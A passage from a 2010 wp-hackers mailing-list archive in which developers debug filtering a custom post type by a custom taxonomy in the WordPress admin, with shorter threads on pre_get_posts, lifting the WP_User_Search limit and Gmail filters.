> >> >> line 64 uses "$request['classement-fr']" and they don't match.
>  Change
> >> line
> >> >> 56 to be "name=classement-fr".
> >> >>
> >> >> -Mike
> >> >>
> >> >> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
> >> >>
> >> >>> Mike,
> >> >>> classement_fr is the name of the taxonomy.
> >> >>> classement-fr is the value of the query_var argument.
> >> >>>
> >> >>> Jimmy
> >> >>>
> >> >>>
> >> >>>
> >> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >> >>>
> >> >>>> Jimmy,
> >> >>>>
> >> >>>> I just noticed, '[classement_fr] => 6' is not in your array.
> >> >>>>
> >> >>>> First try to use either "classement_fr" everywhere or
> "classement-fr"
> >> >> and
> >> >>>> see if that fixes it.
> >> >>>>
> >> >>>> -Mike
> >> >>>>
> >> >>>> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
> >> >>>>
> >> >>>>> Array ( [order] => asc [orderby] => menu_order title [post_type]
> =>
> >> >>>>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1
> )
> >> >>>>>
> >> >>>>> url after clicking "filter" button :
> >> >>>>>
> >> >>>>>
> >> >>>>
> >> >>
> >>
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >> >>>>>
> >> >>>>>
> >> >>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >> >>>>>
> >> >>>>>> What do you get in the view source when you using this instead:
> >> >>>>>>
> >> >>>>>> function request($request) {
> >> >>>>>>     print_r($request);
> >> >>>>>>     exit;
> >> >>>>>> }
> >> >>>>>>
> >> >>>>>> Also, what's your URL after clicking the "Filter" button?
> >> >>>>>>
> >> >>>>>> -Mike
> >> >>>>>>
> >> >>>>>>
> >> >>>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >> >>>>>>
> >> >>>>>>> now, when I click on filter button the result is always the
> same,
> >> all
> >> >>>>>> list
> >> >>>>>>> of ressources.
> >> >>>>>>>
> >> >>>>>>> my code :
> >> >>>>>>>
> >> >>>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >> >>>>>>>
> >> >>>>>>> function register_profperso_taxonomies() {
> >> >>>>>>>
> >> >>>>>>> register_taxonomy(
> >> >>>>>>> 'classement_fr',
> >> >>>>>>> array( 'ressource_fr' ),
> >> >>>>>>> array(
> >> >>>>>>> 'public' => true,
> >> >>>>>>> 'hierarchical' => true,
> >> >>>>>>> 'labels' => array(
> >> >>>>>>> 'name' => __( 'Classements FR' ),
> >> >>>>>>> 'singular_name' => __( 'Classement FR' )
> >> >>>>>>> ),
> >> >>>>>>> 'query_var' => 'classement-fr',
> >> >>>>>>>     'rewrite' => array( 'slug' => 'cours-fr' ),
> >> >>>>>>> )
> >> >>>>>>> );
> >> >>>>>>> }
> >> >>>>>>>
> >> >>>>>>>
> >> >>>>>>> // pour filtrer les ressources par classement
> >> >>>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts'
> );
> >> >>>>>>>
> >> >>>>>>> function my_restrict_manage_posts() {
> >> >>>>>>> global $typenow;
> >> >>>>>>> if ($typenow=='ressource_fr')
> >> >>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
> >> >>>>>>>
> >> >>>>>>
> >> >>>>
> >> >>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >> >>>>>>> }
> >> >>>>>>>
> >> >>>>>>> add_action( 'request', 'my_request' );
> >> >>>>>>> function my_request($request) {
> >> >>>>>>>    if (isset($request['post_type']) &&
> >> >>>>>>> $request['post_type']=='ressource_fr') {
> >> >>>>>>>            $request['taxonomy'] = 'classement_fr';
> >> >>>>>>>            $request['term'] =
> >> >>>>>>> get_term($request['classement-fr'],'classement_fr')->name;
> >> >>>>>>>            unset($request['name']);
> >> >>>>>>>    }
> >> >>>>>>>    return $request;
> >> >>>>>>> }
> >> >>>>>>>
> >> >>>>>>> generated html :
> >> >>>>>>> <select id="classement_fr" name="classement_fr"> <option
> >> >> value="0">Show
> >> >>>>>> All
> >> >>>>>>> Classements FR</option> <option value="5">Langue oral</option>
> >> >> <option
> >> >>>>>> value
> >> >>>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option>
> <option
> >> >>>>>> value="8
> >> >>>>>>> ">Niveau 3</option> </select><input type="submit"
> >> >>>> id="post-query-submit"
> >> >>>>>>> value="Filtrer" class="button-secondary" />
> >> >>>>>>> _______________________________________________
> >> >>>>>>> wp-hackers mailing list
> >> >>>>>>> wp-hackers at lists.automattic.com
> >> >>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>>>>>
> >> >>>>>> _______________________________________________
> >> >>>>>> wp-hackers mailing list
> >> >>>>>> wp-hackers at lists.automattic.com
> >> >>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>>>>>
> >> >>>>> _______________________________________________
> >> >>>>> wp-hackers mailing list
> >> >>>>> wp-hackers at lists.automattic.com
> >> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>>>
> >> >>>> _______________________________________________
> >> >>>> wp-hackers mailing list
> >> >>>> wp-hackers at lists.automattic.com
> >> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>>>
> >> >>> _______________________________________________
> >> >>> wp-hackers mailing list
> >> >>> wp-hackers at lists.automattic.com
> >> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>
> >> >> _______________________________________________
> >> >> wp-hackers mailing list
> >> >> wp-hackers at lists.automattic.com
> >> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >>
> >> > _______________________________________________
> >> > wp-hackers mailing list
> >> > wp-hackers at lists.automattic.com
> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at dd32.id.au  Fri Jul 23 12:32:51 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Fri, 23 Jul 2010 22:32:51 +1000
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com>
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com>
	<AANLkTin-vXqCSr1HHkWlJhcSPEYga6vnaQhXRf7HwsMg@mail.gmail.com>
	<op.vf7o8yxdr6yny2@perplexifikator.speedport-w-303v-typ-a>
Message-ID: <op.vgaqg0esspxmuu@ho.st>

On Thu, 22 Jul 2010 07:13:36 +1000, Thomas Scholz <info at toscho.de> wrote:

> scribu:
>
>> On Wed, Jul 21, 2010 at 8:14 AM, Andrew Nacin <wp at andrewnacin.com>  
>> wrote:
>>
>>> This is one of the dangers/pitfalls of using pre_get_posts. It seems to
>>> be recommended often for some reason when dealing with custom post
>>> types, but it is much better to modify the request itself, versus any
>>> old get_posts or WP_Query call.
>>>
>>
>> I think the reason it's recommended often is that people usually start
>> looking into the WP_Query class first and 'pre_get_posts' looks like the
>> right place to hook into.
>
> Maybe a comment above this filter with pointers to better places would be
> useful?

This might be a good idea on some of the more commonly abused hooks, or  
more specifically, filters which exist in code which can exist in multiple  
contexts.
PHPDoc comments at the start of functions do sometimes reference the  
filters used within, but often some people may skip the large chunk of  
text in preference for the code.

There once was a time where WP_Query was mainly utilised by the actual  
query, get_posts/get_pages etc duplicated their own content, and since  
they've been reduced to utilising existing code, developers who did it  
that way once upon a time, may also be bringing through bad practices.

For example, I've seen people suggesting using is_admin() inside certain  
filters to exclude the admin, where, in actual fact, they should be  
hooking somewhere completely different to prevent affecting other queries.  
Unless people highlight to others (and menu's have really helped do this)  
that doing things in certain ways will break code, people dont change, and  
new articles/blog posts dont get made explaining the "correct" new way of  
achieving it.

-- 
Dion Hulse / dd32
Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From frank at bueltge.de  Fri Jul 23 12:47:08 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 14:47:08 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikeAjOcg77a_zK2xE-CnRgfKPUtYdpaWbYXhNsL@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com> 
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com> 
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
	<AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com> 
	<BCDD0CCE-A01B-459E-BE4D-FBF8CBF9ED5A@newclarity.net>
	<AANLkTi=pOK8TiDYvM6deHMfC0eF5hbqsCHWH3=rMO5tE@mail.gmail.com> 
	<AANLkTik1HiBWy5qQv6qDnGcxuC7JX_W=ogMgWoHWJUDN@mail.gmail.com> 
	<AANLkTikeAjOcg77a_zK2xE-CnRgfKPUtYdpaWbYXhNsL@mail.gmail.com>
Message-ID: <AANLkTiny_H22Jswc5P4wU4FGQj+NftCDdOEDi6QosfYr@mail.gmail.com>

no.
my aaray after the filter:

array
  'order' => string 'DESC' (length=4)
  'orderby' => string 'date' (length=4)
  'post_type' => string 'quotes' (length=6)
  'authors' => string '26' (length=2)
  'taxonomy' => string 'authors' (length=7)
  'term' => string 'Ulrich Wickert' (length=14)
  'posts_per_page' => int 20


authors is my taxonomy
Ulrich Wickert is a tag inside the taxonomy authors
quotes is my post type

maybe i can send my plugin?

On Fri, Jul 23, 2010 at 2:32 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
> for me it change nothing :
>
> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>
> function my_restrict_manage_posts() {
> global $typenow;
> if ($typenow=='ressource_fr')
> echo get_taxonomy_html_select( 'classement_fr' );
> //wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> }
>
> add_action( 'request', 'my_request' );
> function my_request($request) {
> ? ? ? //if (isset($request['post_type']) &&
> $request['post_type']=='ressource_fr') {
> ? ? ? if ( is_admin() && '/wp3.0/profperso/wp-admin/edit.php' ==
> $GLOBALS['PHP_SELF'] && isset( $request['post_type'] ) &&
> $request['post_type'] == 'ressource_fr' ) {
> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
> ? ? ? ? ? ? ? $request['term'] =
> get_term($request['classement_fr'],'classement_fr')->name;
> ? ? ? ? ? ? ? unset($request['name']);
> ? ? ? }
> ? ? ? return $request;
> }
>
> function get_taxonomy_html_select($taxonomy_name) {
> $taxonomy = get_taxonomy($taxonomy_name);
> $terms = get_terms($taxonomy_name);
> $label = __("Afficher tout {$taxonomy->label}");
> $html = array();
> $html[] = "<select id=\"$taxonomy_name\" name=\"$taxonomy_name\">";
> $html[] = "<option value=\"0\">$label</option>";
> $this_term = $_GET[$taxonomy_name];
> foreach($terms as $term) {
> $default = ($this_term==$term->term_id ? ' selected="selected"' : '');
> $value = esc_attr($term->name);
> $html[] = "<option value=\"{$term->term_id}\"$default>$value</option>";
> }
> $html[] = "</select>";
> return implode("\n",$html);
> }
>
> same result : no result.
>
> this is the request when I select a taxonomy and click on filter button :
>
> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> ressource_fr [classement_fr] => 6 [taxonomy] => classement_fr [term] =>
> Niveau 1 [posts_per_page] => -1 [posts_per_archive_page] => -1 )
>
> term is empty.
> same for u?
>
>
> 2010/7/23 Frank Bueltge <frank at bueltge.de>
>
>> this works fine on me:
>>
>> i define the taxonomie and post_type via constant:
>> ? ? ? ?define( 'FB_CPT_POST_TYPE_1', 'quotes' );
>> ? ? ? ?define( 'FB_CPT_TAXONOMY_TYPE_1', 'authors' );
>>
>> the two fucntion from Mike:
>> ? ? ? ? ? ? ? ?function get_taxonomy_html_select($taxonomy_name, $args) {
>>
>> ? ? ? ? ? ? ? ? ? ? ? ?$taxonomy = get_taxonomy($taxonomy_name);
>> ? ? ? ? ? ? ? ? ? ? ? ? $terms = get_terms($taxonomy_name, $args);
>> ? ? ? ? ? ? ? ? ? ? ? ?$label = __( 'Show All ' . $taxonomy->label,
>> FB_CPT_TEXTDOMAIN );
>> ? ? ? ? ? ? ? ? ? ? ? ? $html = array();
>> ? ? ? ? ? ? ? ? ? ? ? ?$html[] = '<select id="' . $taxonomy_name . '"
>> name="' .
>> $taxonomy_name . '">';
>> ? ? ? ? ? ? ? ? ? ? ? ?$html[] = '<option value="0">' . $label .
>> '</option>';
>> ? ? ? ? ? ? ? ? ? ? ? ?$this_term = $_GET[$taxonomy_name];
>> ? ? ? ? ? ? ? ? ? ? ? ?foreach($terms as $term) {
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?$default = ($this_term == $term->term_id ? '
>> selected="selected"' : '');
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?$value = esc_attr($term->name);
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? $value = $value . ' (' . (int)$term->count
>> . ') ';
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? $html[] = '<option value="' .
>> $term->term_id . '"' . $default .
>> '>' . $value . '</option>';
>> ? ? ? ? ? ? ? ? ? ? ? ?}
>> ? ? ? ? ? ? ? ? ? ? ? ?$html[] = '</select>';
>> ? ? ? ? ? ? ? ? ? ? ? ?return implode( "\n", $html );
>> ? ? ? ? ? ? ? ?}
>>
>> ? ? ? ? ? ? ? ? function request($request) {
>> ? ? ? ? ? ? ? ? ? ? ? ?global $pagenow;
>>
>> ? ? ? ? ? ? ? ? ? ? ? ?if ( is_admin() && 'edit.php' == $pagenow && isset(
>> $request['post_type'] ) && FB_CPT_POST_TYPE_1 == $request['post_type']
>> ) {
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?$request['taxonomy'] =
>> FB_CPT_TAXONOMY_TYPE_1;
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?$request['term'] =
>> get_term($request[FB_CPT_TAXONOMY_TYPE_1],
>> FB_CPT_TAXONOMY_TYPE_1)->name;
>> ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? unset($request['name']);
>>
>> ? ? ? ? ? ? ? ? ? ? ? ?}
>>
>> ? ? ? ? ? ? ? ? ? ? ? ?return $request;
>> ? ? ? ? ? ? ? ?}
>>
>>
>> On Fri, Jul 23, 2010 at 2:19 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
>> > function my_request($request) {
>> > ? ? ? //if (isset($request['post_type']) &&
>> > $request['post_type']=='ressource_fr') {
>> > ? ? ? if ( is_admin() && '/wp3.0/profperso/wp-admin/edit.php' ==
>> > $GLOBALS['PHP_SELF'] && isset( $request['post_type'] ) &&
>> > $request['post_type'] == 'ressource_fr' ) {
>> > ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
>> > ? ? ? ? ? ? ? $request['term'] =
>> > get_term($request['classement-fr'],'classement_fr')->name;
>> > ? ? ? ? ? ? ? print_r($request);
>> > ? ? ? ? ? ? ? unset($request['name']);
>> > ? ? ? }
>> > ? ? ? return $request;
>> > }
>> >
>> > it print :
>> >
>> > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
>> > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1
>> > [taxonomy] => classement_fr [term] => )
>> >
>> > term is empty, maybe it's the reason.
>> >
>> >
>> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >
>> >> Jimmy,
>> >>
>> >> I don't know. ?You've got something about your implementation that I
>> can't
>> >> figure out. ?Maybe someone else can. ?Sorry.
>> >>
>> >> -Mike
>> >>
>> >> On Jul 23, 2010, at 7:36 AM, Jimmy Roy wrote:
>> >>
>> >> > actually at first it was name-classement-fr, then I change to try.
>> >> >
>> >> > the difference is :
>> >> > name=classement_fr : chose a custom taxonomy andclick on filter return
>> >> all
>> >> > results in any case.
>> >> > name=classement-fr : chose a custom taxonomy andclick on filter return
>> no
>> >> > result in any case.
>> >> >
>> >> > Jimmy
>> >> >
>> >> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >> >
>> >> >> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr"
>> >> whereas
>> >> >> line 64 uses "$request['classement-fr']" and they don't match.
>> ?Change
>> >> line
>> >> >> 56 to be "name=classement-fr".
>> >> >>
>> >> >> -Mike
>> >> >>
>> >> >> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
>> >> >>
>> >> >>> Mike,
>> >> >>> classement_fr is the name of the taxonomy.
>> >> >>> classement-fr is the value of the query_var argument.
>> >> >>>
>> >> >>> Jimmy
>> >> >>>
>> >> >>>
>> >> >>>
>> >> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >> >>>
>> >> >>>> Jimmy,
>> >> >>>>
>> >> >>>> I just noticed, '[classement_fr] => 6' is not in your array.
>> >> >>>>
>> >> >>>> First try to use either "classement_fr" everywhere or
>> "classement-fr"
>> >> >> and
>> >> >>>> see if that fixes it.
>> >> >>>>
>> >> >>>> -Mike
>> >> >>>>
>> >> >>>> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>> >> >>>>
>> >> >>>>> Array ( [order] => asc [orderby] => menu_order title [post_type]
>> =>
>> >> >>>>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1
>> )
>> >> >>>>>
>> >> >>>>> url after clicking "filter" button :
>> >> >>>>>
>> >> >>>>>
>> >> >>>>
>> >> >>
>> >>
>> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
>> >> >>>>>
>> >> >>>>>
>> >> >>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >> >>>>>
>> >> >>>>>> What do you get in the view source when you using this instead:
>> >> >>>>>>
>> >> >>>>>> function request($request) {
>> >> >>>>>> ? ? print_r($request);
>> >> >>>>>> ? ? exit;
>> >> >>>>>> }
>> >> >>>>>>
>> >> >>>>>> Also, what's your URL after clicking the "Filter" button?
>> >> >>>>>>
>> >> >>>>>> -Mike
>> >> >>>>>>
>> >> >>>>>>
>> >> >>>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> >> >>>>>>
>> >> >>>>>>> now, when I click on filter button the result is always the
>> same,
>> >> all
>> >> >>>>>> list
>> >> >>>>>>> of ressources.
>> >> >>>>>>>
>> >> >>>>>>> my code :
>> >> >>>>>>>
>> >> >>>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>> >> >>>>>>>
>> >> >>>>>>> function register_profperso_taxonomies() {
>> >> >>>>>>>
>> >> >>>>>>> register_taxonomy(
>> >> >>>>>>> 'classement_fr',
>> >> >>>>>>> array( 'ressource_fr' ),
>> >> >>>>>>> array(
>> >> >>>>>>> 'public' => true,
>> >> >>>>>>> 'hierarchical' => true,
>> >> >>>>>>> 'labels' => array(
>> >> >>>>>>> 'name' => __( 'Classements FR' ),
>> >> >>>>>>> 'singular_name' => __( 'Classement FR' )
>> >> >>>>>>> ),
>> >> >>>>>>> 'query_var' => 'classement-fr',
>> >> >>>>>>> ? ? 'rewrite' => array( 'slug' => 'cours-fr' ),
>> >> >>>>>>> )
>> >> >>>>>>> );
>> >> >>>>>>> }
>> >> >>>>>>>
>> >> >>>>>>>
>> >> >>>>>>> // pour filtrer les ressources par classement
>> >> >>>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts'
>> );
>> >> >>>>>>>
>> >> >>>>>>> function my_restrict_manage_posts() {
>> >> >>>>>>> global $typenow;
>> >> >>>>>>> if ($typenow=='ressource_fr')
>> >> >>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>> >> >>>>>>>
>> >> >>>>>>
>> >> >>>>
>> >> >>
>> >>
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>> >> >>>>>>> }
>> >> >>>>>>>
>> >> >>>>>>> add_action( 'request', 'my_request' );
>> >> >>>>>>> function my_request($request) {
>> >> >>>>>>> ? ?if (isset($request['post_type']) &&
>> >> >>>>>>> $request['post_type']=='ressource_fr') {
>> >> >>>>>>> ? ? ? ? ? ?$request['taxonomy'] = 'classement_fr';
>> >> >>>>>>> ? ? ? ? ? ?$request['term'] =
>> >> >>>>>>> get_term($request['classement-fr'],'classement_fr')->name;
>> >> >>>>>>> ? ? ? ? ? ?unset($request['name']);
>> >> >>>>>>> ? ?}
>> >> >>>>>>> ? ?return $request;
>> >> >>>>>>> }
>> >> >>>>>>>
>> >> >>>>>>> generated html :
>> >> >>>>>>> <select id="classement_fr" name="classement_fr"> <option
>> >> >> value="0">Show
>> >> >>>>>> All
>> >> >>>>>>> Classements FR</option> <option value="5">Langue oral</option>
>> >> >> <option
>> >> >>>>>> value
>> >> >>>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option>
>> <option
>> >> >>>>>> value="8
>> >> >>>>>>> ">Niveau 3</option> </select><input type="submit"
>> >> >>>> id="post-query-submit"
>> >> >>>>>>> value="Filtrer" class="button-secondary" />
>> >> >>>>>>> _______________________________________________
>> >> >>>>>>> wp-hackers mailing list
>> >> >>>>>>> wp-hackers at lists.automattic.com
>> >> >>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >>>>>>
>> >> >>>>>> _______________________________________________
>> >> >>>>>> wp-hackers mailing list
>> >> >>>>>> wp-hackers at lists.automattic.com
>> >> >>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >>>>>>
>> >> >>>>> _______________________________________________
>> >> >>>>> wp-hackers mailing list
>> >> >>>>> wp-hackers at lists.automattic.com
>> >> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >>>>
>> >> >>>> _______________________________________________
>> >> >>>> wp-hackers mailing list
>> >> >>>> wp-hackers at lists.automattic.com
>> >> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >>>>
>> >> >>> _______________________________________________
>> >> >>> wp-hackers mailing list
>> >> >>> wp-hackers at lists.automattic.com
>> >> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >>
>> >> >> _______________________________________________
>> >> >> wp-hackers mailing list
>> >> >> wp-hackers at lists.automattic.com
>> >> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >>
>> >> > _______________________________________________
>> >> > wp-hackers mailing list
>> >> > wp-hackers at lists.automattic.com
>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From piemanek at gmail.com  Fri Jul 23 14:10:47 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Fri, 23 Jul 2010 15:10:47 +0100
Subject: [wp-hackers] Remove limit from WP_User_Search
Message-ID: <AANLkTi=6wqurUXzPmccVhc_6MNGByrDV7hZgNH3MDWUK@mail.gmail.com>

I've added an admin page from where the site owner can export names and
email addresses of all users of a particular role, using WP_User_Search
class:

$user_search = new WP_User_Search( '', '', 'member' );
$results = $user_search->get_results();
[...do stuff...]

But I can't figure how to remove the limit of 50 users that this defaults to
- I need it to return all users. Can someone point me in the right
direction?

Cheers
Simon

From mikeschinkel at newclarity.net  Fri Jul 23 14:27:30 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 10:27:30 -0400
Subject: [wp-hackers] Remove limit from WP_User_Search
In-Reply-To: <AANLkTi=6wqurUXzPmccVhc_6MNGByrDV7hZgNH3MDWUK@mail.gmail.com>
References: <AANLkTi=6wqurUXzPmccVhc_6MNGByrDV7hZgNH3MDWUK@mail.gmail.com>
Message-ID: <05F9BBCD-79E2-4966-81FA-66D79BDCEC0F@newclarity.net>

On Jul 23, 2010, at 10:10 AM, Simon Blackbourn wrote:
> 
> I've added an admin page from where the site owner can export names and
> email addresses of all users of a particular role, using WP_User_Search
> class:
> 
> $user_search = new WP_User_Search( '', '', 'member' );
> $results = $user_search->get_results();
> [...do stuff...]
> 
> But I can't figure how to remove the limit of 50 users that this defaults to
> - I need it to return all users. Can someone point me in the right
> direction?

Try either:

$user_search = new WP_User_Search( '', '', 'member' );
$user_search->users_per_page = PHP_INT_MAX;  // Or a very large number > #users
$results = $user_search->get_results();

Or try a hook in your theme's functions.php file:

add_action( 'pre_user_search', 'my_pre_user_search');
function my_pre_user_search($query) {
	$query->query_limit = '';
}

HTH.

-Mike


From piemanek at gmail.com  Fri Jul 23 15:06:31 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Fri, 23 Jul 2010 16:06:31 +0100
Subject: [wp-hackers] Remove limit from WP_User_Search
In-Reply-To: <05F9BBCD-79E2-4966-81FA-66D79BDCEC0F@newclarity.net>
References: <AANLkTi=6wqurUXzPmccVhc_6MNGByrDV7hZgNH3MDWUK@mail.gmail.com>
	<05F9BBCD-79E2-4966-81FA-66D79BDCEC0F@newclarity.net>
Message-ID: <AANLkTikgp1fmkDWjzyR-f2gYcHj3Osjn-cs_iuVAoXuG@mail.gmail.com>

thanks mike, the pre_user_search filter worked (with the addition of return
$query; to the function).

cheers
simon

From otto at ottodestruct.com  Fri Jul 23 15:21:54 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 23 Jul 2010 10:21:54 -0500
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 87
In-Reply-To: <AANLkTikq=enUh_+ejCjVFUB+ZaTvw3POS=aQUsRBgQRE@mail.gmail.com>
References: <mailman.11927.1279883588.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikq=enUh_+ejCjVFUB+ZaTvw3POS=aQUsRBgQRE@mail.gmail.com>
Message-ID: <AANLkTim_LbP7QNHnRqQmfCrM7kS8woT=oPhcSYnEVzme@mail.gmail.com>

On Fri, Jul 23, 2010 at 6:40 AM, Jared Williams <jaredwilli at gmail.com> wrote:
> Sorry but this is irrelevant.
>
> Is it possible to get this email list delivered as a once a day email, that
> sends all of the emails of the day in one large message? I would like to be
> subscribed to it but it blows up my inbox.


You have a gmail account. Learn to use filters. They are your friends.

My filter is:

Has the words: listid:"wp-hackers.lists.automattic.com"
Skip Inbox, Apply label "wp-hackers"

Thus, the messages from this list never show up in my Inbox, they show
up as a label on the left side of the screen.


-Otto

From peter.westwood at ftwr.co.uk  Fri Jul 23 16:42:23 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 23 Jul 2010 17:42:23 +0100
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 87
In-Reply-To: <AANLkTim_LbP7QNHnRqQmfCrM7kS8woT=oPhcSYnEVzme@mail.gmail.com>
References: <mailman.11927.1279883588.1338.wp-hackers@lists.automattic.com>
	<AANLkTikq=enUh_+ejCjVFUB+ZaTvw3POS=aQUsRBgQRE@mail.gmail.com>
	<AANLkTim_LbP7QNHnRqQmfCrM7kS8woT=oPhcSYnEVzme@mail.gmail.com>
Message-ID: <504D32D7-CBE9-404A-B7ED-74D96B039092@ftwr.co.uk>


On 23 Jul 2010, at 16:21, Otto wrote:

